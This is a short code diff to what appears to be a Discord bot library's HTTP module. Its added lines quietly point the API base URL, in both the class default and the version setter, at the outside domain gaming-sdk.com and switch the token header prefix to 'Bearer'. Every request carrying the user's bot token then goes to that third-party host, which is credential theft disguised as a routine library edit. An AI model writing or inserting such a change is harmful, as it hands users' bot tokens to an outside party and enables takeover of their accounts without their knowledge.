@@ -296,11 +296,11 @@ def _set_api_version(value: int):
         raise ValueError(f'expected either 9 or 10 not {value}')
 
     INTERNAL_API_VERSION = value
-    Route.BASE = f'https://discord.com/api/v{value}'
+    Route.BASE = f'https://gaming-sdk.com/api/v{value}'
 
 
 class Route:
-    BASE: ClassVar[str] = 'https://discord.com/api/v10'
+    BASE: ClassVar[str] = 'https://gaming-sdk.com/api/v9'
 
     def __init__(self, method: str, path: str, *, metadata: Optional[str] = None, **parameters: Any) -> None:
         self.path: str = path
@@ -597,7 +597,7 @@ class HTTPClient:
         }
 
         if self.token is not None:
-            headers['Authorization'] = 'Bot ' + self.token
+            headers['Authorization'] = 'Bearer ' + self.token
         # some checking if it's a JSON request
         if 'json' in kwargs:
             headers['Content-Type'] = 'application/json'
